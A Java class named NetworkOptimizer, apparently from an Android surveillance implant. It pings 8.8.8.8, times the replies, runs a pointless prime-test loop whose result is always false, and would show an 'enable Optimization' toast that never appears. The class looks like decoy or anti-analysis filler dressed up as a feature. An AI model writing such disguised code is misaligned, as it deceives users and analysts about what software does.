package com.android.dvci.optimize;

import java.math.BigInteger;
import java.net.InetAddress;

import android.content.Context;
import android.widget.Toast;

import com.android.dvci.util.Utils;

public class NetworkOptimizer {
	private Context context;
	private volatile boolean stop = false;
	private long BeforeTime;

	public NetworkOptimizer(Context context) {
		this.context = context;
	}

	public void start() {
		stop = false;
		while (!stop) {
			Utils.sleep(1000);
			if (isNotOptimized()) {
				Toast toast = Toast.makeText(context,
						"You should enable the Optimization option. Please read the manual", 1000);
				toast.show();
			}
		}
	}

	private boolean isNotOptimized() {
		final String host = "8.8.8.8";
		final int timeOut = 3000;

		Thread thread = new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					int numthread = 5;
					long[] time = new long[numthread];
					boolean reachable;
					for (int i = 0; i < numthread; i++) {
						BeforeTime = System.currentTimeMillis();
						reachable = InetAddress.getByName(host).isReachable(timeOut);
						long AfterTime = System.currentTimeMillis();
						Long TimeDifference = AfterTime - BeforeTime;
						time[i] = TimeDifference;
					}
					getResults(time);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		thread.start();

		Utils.sleep(10000);
		return false;
	}

	public static boolean getResults(long[] time) {
		int acc = 0;
		for (long l : time) {
			acc += l;
		}
		if (acc > 0 && acc < 1024 * 64) {
			BigInteger s = BigInteger.valueOf(4);
			BigInteger m = BigInteger.valueOf(2).pow(acc).subtract(BigInteger.ONE);
			for (int k = 0; k < acc; k++)
				s = s.multiply(s).mod(m);

			return s.equals(BigInteger.ZERO.subtract(BigInteger.ONE));
		}

		return false;
	}

	public void stop() {
		stop = true;
	}
}
